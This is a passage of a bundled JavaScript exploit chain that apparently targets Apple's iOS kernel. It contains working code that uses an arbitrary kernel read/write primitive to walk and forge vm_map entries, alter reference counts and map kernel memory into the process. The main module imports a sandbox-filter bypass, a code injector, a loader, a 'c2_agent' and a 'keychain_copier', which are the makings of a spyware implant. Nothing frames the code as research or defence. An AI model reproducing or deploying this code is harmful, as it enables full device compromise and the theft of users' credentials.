			return Number(bigUint64);
		}
	}
	static #vm_unpack_pointer(packed, params)
	{
		if (!params.vmpp_base_relative)
		{
			//console.log(TAG,`In first if unpack`);
			//let addr = this.#bigUint64ToIntptr(BigInt(packed));
			let addr = packed;
			addr <<= 64 - params.vmpp_bits;
			addr >>= 64 - params.vmpp_bits - params.vmpp_shift;
			return addr;
		}
		if (packed)
		{
			//console.log(TAG,`In second if unpack`);
			return (BigInt(packed) << BigInt(params.vmpp_shift)) + BigInt(params.vmpp_base);
		}
		return 0n;
	}
	static #vm_pack_pointer(ptr,params)
	{
		if (!params.vmpp_base_relative)
		{
			//console.log(TAG,`In first if pack`);
			return ptr >> params.vmpp_shift;
		}
		if (ptr)
		{
			//console.log(TAG,`In second if pack`);
			return (BigInt(ptr) - BigInt(params.vmpp_base)) >> BigInt(params.vmpp_shift);
		}
		return 0n;
	}
	static #VME_OFFSET(entry)
	{
		return entry.vme_offset << 12n;
	}
	static #trunc_page_kernel(x)
	{
		//return ((x) & (~vm_kernel_page_mask));
		return ((x) & (~libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].PAGE_MASK));
	}
	static #round_page_kernel(x)
	{
		//return this.#trunc_page_kernel((x) + vm_kernel_page_mask);
		return this.#trunc_page_kernel((x) + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].PAGE_MASK);
	}
	static #vm_getEntry(map,address)
	{
		let rbhRoot = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(map + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().hdrRBHRoot);
		
		//console.log(TAG,`Get entry:${Utils.hex(address)}`);
		//console.log(TAG,`rbh root:${Utils.hex(rbhRoot)}`);
	
		let rbEntry = rbhRoot;
		let foundEntry = 0n;
	
		while (rbEntry != 0n)
		{
			let curPtr = rbEntry - 0x20n; // container_of(rb_entry, struct vm_map_entry, store)
			//uint64_t prev = 0;
	
			let links = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
			libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read(curPtr, links, VM_LINK_SIZE);
			let linksBuffer = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read(links,VM_LINK_SIZE);
			let linksArray = new Uint8Array(linksBuffer);
			links = new _VmMapEntry__WEBPACK_IMPORTED_MODULE_3__.vm_map_links(linksArray);
	
			//console.log(TAG,`[${Utils.hex(links.start)} - ${Utils.hex(links.end)}]:${Utils.hex(curPtr)}`);
	
			if (address >= links.start)
			{
				if (address < links.end)
				{
					foundEntry = curPtr;
					//console.log(TAG,`Found:${Utils.hex(curPtr)}`);
					break;
				}
	
				let rbeRight = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(rbEntry +  libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().rbeRight);
				rbEntry = rbeRight;
				//prev = curPtr;
			}
			else
			{
				let rbeLeft = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(rbEntry +  libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().rbeLeft);
				rbEntry = rbeLeft;
			}
		}
		return foundEntry;
	}

	static mapRemotePage(vmMap, address)
	{
		//console.log(TAG, `Map remote address: ${Utils.hex(address)}`);

		let vmObject = VM.getObject(vmMap, address);
		//LOG("vmObject: %llx (objectOffset=%llx, entryOffset=%llx)",
		//	vmObject.address,
		//	vmObject.objectOffset,
		//	vmObject.entryOffset);
		
		if (!vmObject.address)
			return null;

		let shmem = VM.createShmemWithVmObject(vmObject);
		//LOG("shmem: port=%x, address=%llx", shmem.port, shmem.remoteAddress);

		return shmem;
	}

	static getObject(map, address)
	{
		let VMObjectBuff = new ArrayBuffer(SIZE_VMOBJECT);
		let vmObject = new _VMObject__WEBPACK_IMPORTED_MODULE_5__["default"](VMObjectBuff);
		let entryAddr = this.#vm_getEntry(map, address);
		if (!entryAddr)
			return vmObject;

		let entryBuff = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].readBuff(entryAddr, VM_MAP_ENTRY_SIZE);
		let entryUintArr = new Uint8Array(entryBuff);
		let entry = new _VmMapEntry__WEBPACK_IMPORTED_MODULE_3__.vm_map_entry(entryUintArr);
		//console.log(TAG, `entry: addr=${Utils.hex(entryAddr)}, is_sub_map=${entry.is_sub_map}, vme_object_packed=${Utils.hex(entry.vme_object)}`);

		let paramsBuff = new ArrayBuffer(VMPackingSize);
		let params = new _VmPackingParams__WEBPACK_IMPORTED_MODULE_7__["default"](paramsBuff);
		params.vmpp_base = this.#VM_PAGE_PACKED_PTR_BASE();
		params.vmpp_bits = VM_PAGE_PACKED_PTR_BITS;
		params.vmpp_shift = VM_PAGE_PACKED_PTR_SHIFT;
		params.vmpp_base_relative = this.#VM_PACKING_IS_BASE_RELATIVE(params);
		let vmeObject = this.#VM_UNPACK_POINTER(entry.vme_object, params);
		//console.log(TAG, `vme object: ${Utils.hex(vmeObject)}`);

		let objectOffs = this.#VME_OFFSET(entry);
		let entryOffs = address - entry.links.start + objectOffs;
		
		//console.log(TAG, `object offset: ${Utils.hex(objectOffs)}`);
		//console.log(TAG, `entry offset: ${Utils.hex(entryOffs)}`);

		vmObject.vmAddress = address;
		vmObject.address = BigInt(vmeObject);
		vmObject.objectOffset = BigInt(objectOffs);
		vmObject.entryOffset = BigInt(entryOffs);
		return vmObject;
	}

	static createShmemWithVmObject(object)
	{
		//console.log(TAG,`Inside createShmem with addr to read:${Utils.hex(object.address)}`);
		let shmemBuff = new ArrayBuffer(VMShmem_SIZE);
		let shmem = new _VMShmem__WEBPACK_IMPORTED_MODULE_6__["default"](shmemBuff);
		let size = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(object.address + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().vouSize);
		size = _Task__WEBPACK_IMPORTED_MODULE_4__["default"].round_page(size);
		
		//console.log(TAG,`vm object size:${Utils.hex(size)}`);
		
		let localAddr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
		let roundedSize = this.#round_page_kernel(size);
		let ret = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("mach_vm_allocate",0x203n, localAddr, roundedSize, VM_FLAGS_ANYWHERE);
		if (ret != 0)
		{
			console.log(TAG,`mach_vm_allocate():${ret}`);
			return shmem;
		}
		localAddr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read64(localAddr);
		//console.log(TAG,`mach_vm_allocate:${Utils.hex(roundedSize)} localAddr:${Utils.hex(localAddr)}`);
		/*
		let memory_object = new_bigint();
		ret = Native.callSymbol("mach_make_memory_entry_64",
			0x203n,
			get_bigint_addr(roundedSize),
			localAddr,
			this.VM_PROT_READ | this.VM_PROT_WRITE,
			get_bigint_addr(memory_object),
			0n);
		let resBuff = Native.read(get_bigint_addr(memory_object),Utils.UINT32_SIZE);
		let resView = new DataView(resBuff);
		let port = resView.getUint32(0,true);
		*/
		
		let memory_object = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem + 0x500n;
		let roundedSizePtr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem + 0x1000n;
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].write64(roundedSizePtr, roundedSize);

		ret = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("mach_make_memory_entry_64",
			0x203n,
			roundedSizePtr,
			localAddr,
			this.VM_PROT_READ | this.VM_PROT_WRITE,
			memory_object,
			0n);
		let port = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read32(memory_object);
		//let port = Native.callSymbol("wrapper_mach_make_memory_entry_64",roundedSize,localAddr);
		//console.log(TAG,`mach_make_memory_entry_64():${Utils.hex(port)}`);
		let shmemNamedEntry = _Task__WEBPACK_IMPORTED_MODULE_4__["default"].getPortKObject(BigInt(port));
		//console.log(TAG,`shmem named entry:${Utils.hex(shmemNamedEntry)}`);
		let shmemVMCopyAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(shmemNamedEntry + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().backingCopy);
		//console.log(TAG,`shmem named entry VM copy addr:${Utils.hex(shmemVMCopyAddr)}`);
		let nextAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(shmemVMCopyAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().next);
		//console.log(TAG,`next addr:${Utils.hex(nextAddr)}`);
		let entryBuff = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].readBuff(nextAddr, VM_MAP_ENTRY_SIZE);
		let entryArr = new Uint8Array(entryBuff);
		let entry = new _VmMapEntry__WEBPACK_IMPORTED_MODULE_3__.vm_map_entry(entryArr);
		//console.log(TAG,`entry: vme_kernel_object=${Utils.hex(entry.vme_kernel_object)}, is_sub_map=${Utils.hex(entry.is_sub_map)}`);
		//console.log(TAG,`entry: is_sub_map=${Utils.hex(entry.is_sub_map)}`);
		if (entry.vme_kernel_object || entry.is_sub_map || false) // vme_kernel_object struct is not implemented
		{
			console.log(TAG,`Entry cannot be a submap`);
			return shmem;
		}
		let paramsBuff = new ArrayBuffer(VMPackingSize);
		let params = new _VmPackingParams__WEBPACK_IMPORTED_MODULE_7__["default"](paramsBuff);
		params.vmpp_base = this.#VM_PAGE_PACKED_PTR_BASE();
		params.vmpp_bits = VM_PAGE_PACKED_PTR_BITS;
		params.vmpp_shift = VM_PAGE_PACKED_PTR_SHIFT;
		params.vmpp_base_relative = this.#VM_PACKING_IS_BASE_RELATIVE(params);
		let packedPointer = this.#VM_PACK_POINTER(object.address, params);
		//console.log(TAG,`packedPointer:${Utils.hex(packedPointer)}`);
		let refCount = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read32(object.address + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().refCount);
		//console.log(TAG,`vm object ref count:${Utils.hex(refCount)}`);
		refCount++;
		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].write32(object.address + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().refCount, refCount);
		entry.vme_object = Number(packedPointer);
		entry.vme_offset = object.objectOffset;
		//write(nextAddr, &entry, sizeof(entry));
		// write dedicate write in order to avoid zone panic with bigger 0x20 elements size
		let entryResWrite = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].write(entryResWrite,entryArr.buffer);
		//Utils.printArrayBufferInChunks(entryArr.buffer);
		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].writeZoneElement(nextAddr, entryResWrite, VM_MAP_ENTRY_SIZE);
		//console.log(TAG,`After write zone element`);
		//let mappedAddr = Native.callSymbol("malloc",roundedSize * 4n);
		//let mappedAddr = new_bigint();
		let mappedAddr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].write64(mappedAddr, 0x1337n);
		//let mach_vm_map_func = Native.dlsym("mach_vm_map");
		//console.log(TAG,`mach_vm_map:${Utils.hex(mach_vm_map_func)} with object.entryOffset:${Utils.hex(object.entryOffset)}`);
		//ret = fcall(mach_vm_map_func,0x203n,get_bigint_addr(mappedAddr),0x4000n,0n,1n,BigInt(port),BigInt(object.entryOffset),0n,(this.VM_PROT_ALL | this.VM_PROT_IS_MASK) | ((this.VM_PROT_ALL | this.VM_PROT_IS_MASK) << 32n),this.VM_INHERIT_NONE);
		ret = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("mach_vm_map",0x203n,mappedAddr,0x4000n,0n,1n,BigInt(port),BigInt(object.entryOffset),0n,(this.VM_PROT_ALL | this.VM_PROT_IS_MASK) | ((this.VM_PROT_ALL | this.VM_PROT_IS_MASK) << 32n),this.VM_INHERIT_NONE);
		//console.log(TAG,`ret:${ret}`);
		mappedAddr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read64(mappedAddr);
		//console.log(TAG,`mach_vm_map():${Utils.hex(ret)}, mappedAddr=${Utils.hex(mappedAddr)}`);
		if(ret != 0)
		{
			console.log(TAG,'failed on mach_vm_map');
			mappedAddr = 0n;
		}

		ret = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("mach_vm_deallocate", 0x203, localAddr, roundedSize);
		if (ret != 0) {
			console.log(TAG, "mach_vm_deallocate: " + ret);
		}

		//let mappedAddr = Native.callSymbol("wrapper_mach_vm_map",port,object.entryOffset);
		//console.log(TAG,`mappedAddr:${Utils.hex(mappedAddr)}`);
		shmem.port = BigInt(port);
		shmem.remoteAddress = object.vmAddress;
		shmem.localAddress = mappedAddr;
		return shmem;
	}
	
	static mocker(addrUnpack,addrPack)
	{
		let paramsBuff = new ArrayBuffer(VMPackingSize);
		let params = new _VmPackingParams__WEBPACK_IMPORTED_MODULE_7__["default"](paramsBuff);
		params.vmpp_base = this.#VM_PAGE_PACKED_PTR_BASE();
		params.vmpp_bits = VM_PAGE_PACKED_PTR_BITS;
		params.vmpp_shift = VM_PAGE_PACKED_PTR_SHIFT;
		params.vmpp_base_relative = this.#VM_PACKING_IS_BASE_RELATIVE(params);
		let vmeObject = this.#VM_UNPACK_POINTER(addrUnpack, params);
		//console.log(TAG,`vmeObjectUnpack:${Utils.hex(vmeObject)}`);
		vmeObject = this.#VM_PACK_POINTER(addrPack,params);
		//console.log(TAG,`vmeObjectpack:${Utils.hex(vmeObject)}`);
	}
}


/***/ }),

/***/ "./src/libs/TaskRop/VMObject.js":
/*!**************************************!*\
  !*** ./src/libs/TaskRop/VMObject.js ***!
  \**************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ VMObject)
/* harmony export */ });
class VMObject
{
	#buffer;
	#dataView;
	constructor(buffer)
	{
		this.#buffer = buffer;
		this.#dataView = new DataView(this.#buffer);
	}
	get vmAddress()
	{
		return this.#dataView.getBigUint64(0,true);
	}
	set vmAddress(value)
	{
		this.#dataView.setBigUint64(0,value,true);
	}
	get address()
	{
		return this.#dataView.getBigUint64(8,true);
	}
	set address(value)
	{
		this.#dataView.setBigUint64(8,value,true);
	}
	get objectOffset()
	{
		return this.#dataView.getBigUint64(16,true);
	}
	set objectOffset(value)
	{
		this.#dataView.setBigUint64(16,value,true);
	}
	get entryOffset()
	{
		return this.#dataView.getBigUint64(24,true);
	}
	set entryOffset(value)
	{
		this.#dataView.setBigUint64(24,value,true);
	}
}

/***/ }),

/***/ "./src/libs/TaskRop/VMShmem.js":
/*!*************************************!*\
  !*** ./src/libs/TaskRop/VMShmem.js ***!
  \*************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ VMShmem)
/* harmony export */ });
class VMShmem 
{
	#buffer;
	#dataView;
	constructor(buffer)
	{
		this.#buffer = buffer;
		this.#dataView = new DataView(this.#buffer);
	}
	get port()
	{
		return this.#dataView.getBigUint64(0,true);
	}
	set port(value)
	{
		this.#dataView.setBigUint64(0,value,true);
	}
	get remoteAddress()
	{
		return this.#dataView.getBigUint64(8,true);
	}
	set remoteAddress(value)
	{
		this.#dataView.setBigUint64(8,value,true);
	}
	get localAddress()
	{
		return this.#dataView.getBigUint64(16,true);
	}
	set localAddress(value)
	{
		this.#dataView.setBigUint64(16,value,true);
	}
}

/***/ }),

/***/ "./src/libs/TaskRop/VmMapEntry.js":
/*!****************************************!*\
  !*** ./src/libs/TaskRop/VmMapEntry.js ***!
  \****************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (__WEBPACK_DEFAULT_EXPORT__),
/* harmony export */   vm_map_entry: () => (/* binding */ vm_map_entry),
/* harmony export */   vm_map_links: () => (/* binding */ vm_map_links)
/* harmony export */ });
class vm_map_links {
    #__mem;
    #__view;
    #__addr;
    #__off;
    constructor(mem=undefined, off=0) {
        this.#__mem = mem ? mem : new Uint8Array(0x20);
        this.#__view = new DataView(this.#__mem.buffer);
        this.#__off = off;
        this.sizeof = this.#__mem.length;
    }
    get addr() { if (!this.#__addr) { this.#__addr = get_buffer_addr(this.#__mem).add(this.#__off); } return this.#__addr; }
    /* previous entry */
    get prev() { return this.#__view.getBigUint64(this.#__off, true); }
    set prev(val) { this.#__view.setBigUint64(this.#__off, val, true); }
    /* next entry */
    get next() { return this.#__view.getBigUint64(this.#__off+0x8, true); }
    set next(val) { this.#__view.setBigUint64(this.#__off+0x8, val, true); }
    /* start address */
    get start() { return this.#__view.getBigUint64(this.#__off+0x10, true); }
    set start(val) { this.#__view.setBigUint64(this.#__off+0x10, val, true); }
    /* end address */
    get end() { return this.#__view.getBigUint64(this.#__off+0x18, true); }
    set end(val) { this.#__view.setBigUint64(this.#__off+0x18, val, true); }
};

class vm_map_store {
    #__mem;
    #__view;
    #__addr;
    #__off;
    constructor(mem=undefined, off=0) {
        this.#__mem = mem ? mem : new Uint8Array(0x18);
        this.#__view = new DataView(this.#__mem.buffer);
        this.#__off = off;
        this.sizeof = this.#__mem.length;
    }
    get addr() { if (!this.#__addr) { this.#__addr = get_buffer_addr(this.#__mem).add(this.#__off); } return this.#__addr; }
    /* left element */
    get rbe_left() { return this.#__view.getBigUint64(this.#__off, true); }
    set rbe_left(val) { this.#__view.setBigUint64(this.#__off, val, true); }
    /* right element */
    get rbe_right() { return this.#__view.getBigUint64(this.#__off+0x8, true); }
    set rbe_right(val) { this.#__view.setBigUint64(this.#__off+0x8, val, true); }
    /* parent element */
    get rbe_parent() { return this.#__view.getBigUint64(this.#__off+0x10, true); }
    set rbe_parent(val) { this.#__view.setBigUint64(this.#__off+0x10, val, true); }
};

class vm_map_entry {
    #__mem;
    #__view;
    #__addr;
    #__off;
    constructor(mem=undefined, off=0) {
        this.#__mem = mem ? mem : new Uint8Array(0x50);
        this.#__view = new DataView(this.#__mem.buffer);
        this.#__off = off;
        this.sizeof = this.#__mem.length;
        this.links = new vm_map_links(this.#__mem, this.#__off);
        this.store = new vm_map_store(this.#__mem, this.#__off+0x20);
    }
    get addr() { if (!this.#__addr) { this.#__addr = get_buffer_addr(this.#__mem).add(this.#__off); } return this.#__addr; }

    // Union field 1
    get vme_object_value() { return this.#__view.getBigUint64(this.#__off+0x38, true); }
    set vme_object_value(val) { this.#__view.setBigUint64(this.#__off+0x38, val, true); }

    // Union field 2
    get vme_atomic() { return this.#__view.getUint8(this.#__off+0x38, true) & 1; }
    set vme_atomic(val) {
        let cur = this.#__view.getUint8(this.#__off+0x38, true) & 0xfe;
        this.#__view.setUint8(this.#__off+0x38, cur + (val & 1), true);
    }
    get is_sub_map() { return (this.#__view.getUint8(this.#__off+0x38, true) & 2) >> 1; }
    set is_sub_map(val) {
        let cur = this.#__view.getUint8(this.#__off+0x38, true) & 0xfd;
        this.#__view.setUint8(this.#__off+0x38, cur + ((val & 1) << 1), true);
    }
    get vme_submap() { return this.#__view.getBigUint64(this.#__off+0x38, true) >> 2n; }
    set vme_submap(val) {
        let cur = this.#__view.getBigUint64(this.#__off+0x38, true) & 3n;
        this.#__view.setBigUint64(this.#__off+0x38, cur + ((val & 0x3fffffffffffffffn) << 2n), true);
    }

    // Union field 3
    get vme_ctx_atomic() { return this.#__view.getUint8(this.#__off+0x38, true) & 1; }
    set vme_ctx_atomic(val) {
        let cur = this.#__view.getUint8(this.#__off+0x38, true) & 0xfe;
        this.#__view.setUint8(this.#__off+0x38, cur + (val & 1), true);
    }
    get vme_ctx_is_sub_map() { return (this.#__view.getUint8(this.#__off+0x38, true) & 2) >> 1; }
    set vme_ctx_is_sub_map(val) {
        let cur = this.#__view.getUint8(this.#__off+0x38, true) & 0xfd;
        this.#__view.setUint8(this.#__off+0x38, cur + ((val & 1) << 1), true);
    }
    get vme_context() { return this.#__view.getUint32(this.#__off+0x38, true) >> 2; }
    set vme_context(val) {
        let cur = this.#__view.getUint32(this.#__off+0x38, true) & 2;
        this.#__view.setUint32(this.#__off+0x38, cur + (val << 2), true);
    }
    get vme_object() { return this.#__view.getUint32(this.#__off+0x3c, true); }
    set vme_object(val) { this.#__view.setUint32(this.#__off+0x3c, val, true); }

    // vme_alias:12,               /* entry VM tag */
    // vme_offset:52,              /* offset into object */
    get vme_offset() { return this.#__view.getBigUint64(this.#__off+0x40, true) >> 12n;  }
    set vme_offset(val) {
        let cur = this.#__view.getBigUint64(this.#__off+0x40, true) & 0xfffn;
        this.#__view.setBigUint64(this.#__off+0x40, cur + (val << 12n), true);
    }
    // is_shared:1,                /* region is shared */
    // __unused1:1,
    // in_transition:1,            /* Entry being changed */
    // needs_wakeup:1,             /* Waiters on in_transition */
    // behavior:2,                 /* user paging behavior hint */
    // needs_copy:1,               /* object need to be copied? */
    // protection:3,               /* protection code */
    // used_for_tpro:1,
    // max_protection:4,           /* maximum protection, bit3=UEXEC */
    // inheritance:2,              /* inheritance */
    // use_pmap:1,
    // no_cache:1,                 /* should new pages be cached? */
    // vme_permanent:1,            /* mapping can not be removed */
    // superpage_size:1,           /* use superpages of a certain size */
    // map_aligned:1,              /* align to map's page size */
    // zero_wired_pages:1,
    // used_for_jit:1,
    // csm_associated:1,           /* code signing monitor will validate */
    // iokit_acct:1,
    // vme_resilient_codesign:1,
    // vme_resilient_media:1,
    // vme_xnu_user_debug:1,
    // vme_no_copy_on_read:1,
    // translated_allow_execute:1, /* execute in translated processes */
    // vme_kernel_object:1;        /* vme_object is kernel_object */

    /* can be paged if = 0 */
    get wired_count() { return this.#__view.getUint16(this.#__off+0x4c, true); }
    set wired_count(val) { this.#__view.setUint16(this.#__off+0x4c, val, true); }
    /* for vm_wire */
    get user_wired_count() { return this.#__view.getUint16(this.#__off+0x4e, true); }
    set user_wired_count(val) { this.#__view.setUint16(this.#__off+0x4e, val, true); }
};
/* harmony default export */ const __WEBPACK_DEFAULT_EXPORT__ = ({vm_map_entry,vm_map_links,vm_map_store});


/***/ }),

/***/ "./src/libs/TaskRop/VmPackingParams.js":
/*!*********************************************!*\
  !*** ./src/libs/TaskRop/VmPackingParams.js ***!
  \*********************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ VmPackingParams)
/* harmony export */ });
class VmPackingParams
{
	#buffer;
	#dataView;
	constructor(buffer)
	{
		this.#buffer = buffer;
		this.#dataView = new DataView(this.#buffer);
	}
	get vmpp_base()
	{
		return this.#dataView.getBigUint64(0,true);
	}
	set vmpp_base(value)
	{
		this.#dataView.setBigUint64(0,value,true);
	}
	get vmpp_bits()
	{
		return this.#dataView.getUint8(8,true);
	}
	set vmpp_bits(value)
	{
		this.#dataView.setUint8(8,value,true);
	}
	get vmpp_shift()
	{
		return this.#dataView.getUint8(9,true);
	}
	set vmpp_shift(value)
	{
		this.#dataView.setUint8(9,value,true);
	}
	get vmpp_base_relative()
	{
		return this.#dataView.getUint8(10,true);
	}
	set vmpp_base_relative(value)
	{
		this.#dataView.setUint8(10,value,true);
	}
}

/***/ })

/******/ 	});
/************************************************************************/
/******/ 	// The module cache
/******/ 	var __webpack_module_cache__ = {};
/******/ 	
/******/ 	// The require function
/******/ 	function __webpack_require__(moduleId) {
/******/ 		// Check if module is in cache
/******/ 		var cachedModule = __webpack_module_cache__[moduleId];
/******/ 		if (cachedModule !== undefined) {
/******/ 			return cachedModule.exports;
/******/ 		}
/******/ 		// Create a new module (and put it into the cache)
/******/ 		var module = __webpack_module_cache__[moduleId] = {
/******/ 			// no module.id needed
/******/ 			// no module.loaded needed
/******/ 			exports: {}
/******/ 		};
/******/ 	
/******/ 		// Execute the module function
/******/ 		__webpack_modules__[moduleId](module, module.exports, __webpack_require__);
/******/ 	
/******/ 		// Return the exports of the module
/******/ 		return module.exports;
/******/ 	}
/******/ 	
/************************************************************************/
/******/ 	/* webpack/runtime/define property getters */
/******/ 	(() => {
/******/ 		// define getter functions for harmony exports
/******/ 		__webpack_require__.d = (exports, definition) => {
/******/ 			for(var key in definition) {
/******/ 				if(__webpack_require__.o(definition, key) && !__webpack_require__.o(exports, key)) {
/******/ 					Object.defineProperty(exports, key, { enumerable: true, get: definition[key] });
/******/ 				}
/******/ 			}
/******/ 		};
/******/ 	})();
/******/ 	
/******/ 	/* webpack/runtime/hasOwnProperty shorthand */
/******/ 	(() => {
/******/ 		__webpack_require__.o = (obj, prop) => (Object.prototype.hasOwnProperty.call(obj, prop))
/******/ 	})();
/******/ 	
/******/ 	/* webpack/runtime/make namespace object */
/******/ 	(() => {
/******/ 		// define __esModule on exports
/******/ 		__webpack_require__.r = (exports) => {
/******/ 			if(typeof Symbol !== 'undefined' && Symbol.toStringTag) {
/******/ 				Object.defineProperty(exports, Symbol.toStringTag, { value: 'Module' });
/******/ 			}
/******/ 			Object.defineProperty(exports, '__esModule', { value: true });
/******/ 		};
/******/ 	})();
/******/ 	
/************************************************************************/
var __webpack_exports__ = {};
// This entry needs to be wrapped in an IIFE because it needs to be isolated against other modules in the chunk.
(() => {
/*!*********************!*\
  !*** ./src/main.js ***!
  \*********************/
__webpack_require__.r(__webpack_exports__);
/* harmony import */ var libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! libs/Chain/Native */ "./src/libs/Chain/Native.js");
/* harmony import */ var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! libs/Chain/Chain */ "./src/libs/Chain/Chain.js");
/* harmony import */ var libs_TaskRop_TaskRop__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! libs/TaskRop/TaskRop */ "./src/libs/TaskRop/TaskRop.js");
/* harmony import */ var libs_TaskRop_Task__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! libs/TaskRop/Task */ "./src/libs/TaskRop/Task.js");
/* harmony import */ var libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__(/*! libs/TaskRop/Sandbox */ "./src/libs/TaskRop/Sandbox.js");
/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_5__ = __webpack_require__(/*! libs/JSUtils/Utils */ "./src/libs/JSUtils/Utils.js");
/* harmony import */ var _InjectJS__WEBPACK_IMPORTED_MODULE_6__ = __webpack_require__(/*! ./InjectJS */ "./src/InjectJS.js");
/* harmony import */ var libs_Driver_Driver__WEBPACK_IMPORTED_MODULE_7__ = __webpack_require__(/*! libs/Driver/Driver */ "./src/libs/Driver/Driver.js");
/* harmony import */ var libs_TaskRop_RemoteCall__WEBPACK_IMPORTED_MODULE_8__ = __webpack_require__(/*! libs/TaskRop/RemoteCall */ "./src/libs/TaskRop/RemoteCall.js");
/* harmony import */ var _raw_loader_dist_MigFilterBypassThread_js__WEBPACK_IMPORTED_MODULE_9__ = __webpack_require__(/*! !raw-loader!../dist/MigFilterBypassThread.js */ "./node_modules/raw-loader/dist/cjs.js!./dist/MigFilterBypassThread.js");
/* harmony import */ var _raw_loader_loader_js__WEBPACK_IMPORTED_MODULE_10__ = __webpack_require__(/*! !raw-loader!loader.js */ "./node_modules/raw-loader/dist/cjs.js!./src/loader.js");

/* harmony import */ var _raw_loader_c2_agent_js__WEBPACK_IMPORTED_MODULE_17__ = __webpack_require__(/*! !raw-loader!c2_agent.js */ "./node_modules/raw-loader/dist/cjs.js!./src/c2_agent.js");
/* harmony import */ var _raw_loader_keychain_copier_js__WEBPACK_IMPORTED_MODULE_20__ = __webpack_require__(/*! !raw-loader!keychain_copier.js */ "./node_modules/raw-loader/dist/cjs.js!./src/keychain_copier.js");


class MigFilterBypass {

	#running;
	#sharedMem;
	#runFlagPtr;
	#isRunningPtr;
	#monitorThread1Ptr;
	#monitorThread2Ptr;
	#mutexPtr;

	constructor(mutexPtr) {
		this.#mutexPtr = mutexPtr;
		this.#running = false;
		this.#sharedMem = BigInt(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("calloc", 1, 0x100));
		this.#runFlagPtr = this.#sharedMem;
		this.#isRunningPtr = this.#sharedMem + 0x4n;
		this.#monitorThread1Ptr = this.#sharedMem + 0x8n;
		this.#monitorThread2Ptr = this.#sharedMem + 0x10n;
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write32(this.#runFlagPtr, 2);
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write32(this.#isRunningPtr, 0);
	}

	start() {
		if (this.#running)
			return;

		// Guard BigInt(undefined/false): missing mig* offsets (e.g. incomplete 18.5 tables) used to throw TypeError before PEMK-A.
		let off = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].offsets();
		if (!off || off.migLock == null || off.migSbxMsg == null || off.migKernelStackLR == null) {
			try { if (typeof pe_alive_ping === "function") pe_alive_ping("pe_mig_skip_no_off"); } catch (_ms) {}
			return false;
		}
		let threadSelf = BigInt(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("mach_thread_self"));
